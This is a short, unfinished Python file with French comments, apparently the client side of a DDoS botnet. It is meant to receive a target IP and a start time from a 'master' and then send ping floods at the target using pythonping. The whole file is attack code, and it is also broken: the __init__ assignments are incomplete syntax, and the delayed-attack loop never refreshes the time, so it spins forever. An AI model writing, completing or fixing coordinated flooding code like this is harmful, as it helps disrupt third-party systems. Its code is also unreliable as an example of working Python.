from datetime import datetime
from pythonping import ping

#il faudrait récupérer les valeurs envoyées par le master dans l'init
def __init__ (self):
    self.ip = #receive de l'ip du master
    self.tempsheure = #receive le datetime du master

#lancement du ddos
def ddos(ip, tempsheure):
    format = "%Y-%m-%d %H:%M"
    now = datetime.strftime(datetime.now(), format)
    #ici, lancement de l'attaque immédiatement
    if (now == tempsheure):
        ping(ip, verbose=True, size=400, count=15)
        print("ping okay")
    #ici, lancement de l'attaque en retardé
    #problème est qu'on ne pourra rien faire en attendant l'attaque...
    else:
        i=1
        while i==1 :
            if (now == tempsheure):
                i = 0
                ping(ip, verbose=True, size=400, count=15)
                print("ping ok")







